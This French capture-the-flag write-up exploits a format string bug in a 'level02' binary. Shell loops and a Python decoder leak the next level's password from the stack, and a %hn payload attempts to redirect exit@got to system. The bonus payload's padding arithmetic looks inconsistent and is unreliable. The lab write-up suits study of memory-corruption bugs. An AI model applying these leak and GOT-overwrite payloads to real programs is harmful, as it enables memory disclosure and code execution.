## Attaque Format String 

### ✨ Objectif

Récupérer le mot de passe du niveau suivant, contenu dans le fichier `.pass`, sans y avoir accès en lecture directe.

---

### 🔒 Vulnérabilité repérée

Le programme utilise un `printf(user_input)` sans vérification.
Cela permet une attaque de **format string** pour lire la mémoire de la stack avec `%p`, `%x`, etc.

---

### ⚖️ Analyse du fonctionnement

1. Le programme tente d'ouvrir `.pass` avec `fopen()`.
2. Si `fopen()` échoue (comme dans GDB), il sort.
3. Avant l'échec, la valeur du mot de passe a déjà été lue avec `fgets()` et stockée en mémoire (dans la stack).
4. Ensuite, le programme lit l'entrée utilisateur (ex: `AAAA`), qui est positionnée autour de la **28ème position** sur la stack.
5. En lisant les adresses *juste avant*, on peut extraire les morceaux du mot de passe.

---

### ⚡ Attaque - Lecture Format String

#### 1. Détection de la position de l'input

```bash
for i in $(seq 1 40); do
  python2 -c "print('AAAA' + str($i) + ' /%' + str($i) + '\$x')" | ./level02
done
```

Sortie observée :

```
AAAA 28 /41414141
```

Donc la position de l'entrée utilisateur est bien la **28ème**.

Test direct :

```bash
./level02
--[ Username: AAAA /%28$x
```

Affiche bien `41414141` (valeur hexa de "AAAA").

#### 2. Lecture de la mémoire autour de l'input

```bash
for i in $(seq 20 28); do
  python -c "print 'AAAA' + ' %${i}\$p'" | ./level02
done
```

Extrait des sorties observées :

```
0x756e505234376848
0x45414a3561733951
0x377a7143574e6758
0x354a35686e475873
0x48336750664b394d
```

---

### 💡 Décodage - Script Python

```python
import struct
hex_values = [
    0x756e505234376848,
    0x45414a3561733951,
    0x377a7143574e6758,
    0x354a35686e475873,
    0x48336750664b394d,
]

password = ''.join([struct.pack("<Q", h).decode('utf-8') for h in hex_values])
print("Mot de passe:", password)
```

---

### 🔐 Résultat

Le mot de passe du niveau 3 est affiché sans jamais avoir lu directement le fichier `.pass` !

---

### 🌐 Bonus : tentative d’écriture en mémoire avec format string

#### Adresses trouvées

```
0x6011f8 R_X86_64_JUMP_SLOT  system
0x601228 R_X86_64_JUMP_SLOT  exit
```

On veut rediriger `exit()` vers `system()`.

* Adresse de `system@plt` = `0x4006b0`
* Adresse de `exit@got` = `0x601228`

#### Little endian

On divise 0x4006b0 en deux parties pour écriture via `%hn` :

* base = 0x06b0 (1712)
* haut = 0x4006 (16390)

#### Calcul des paddings

```text
pad1 = 1712 - 16 = 1696
pad2 = (16390 - 1712) % 65536 = 14678
```

Payload finale (exemple) :

```bash
(python -c "print '\x28\x12\x60\x00\x2a\x12\x60\x00' + '%1696c%28$hn' + '%14678c%29$hn'" ; cat) | ./level02
```

---

### 📅 Rappel

* `%<i>$p` permet d'afficher la ième case sur la stack
* `fgets()` lit le fichier AVANT de lire votre input → donc il est en mémoire
* `struct.pack("<Q", ...)` reconstruit l'ordre little endian en texte lisible
* `%hn` permet d'écrire 2 octets à une adresse en mémoire (partie basse puis haute)

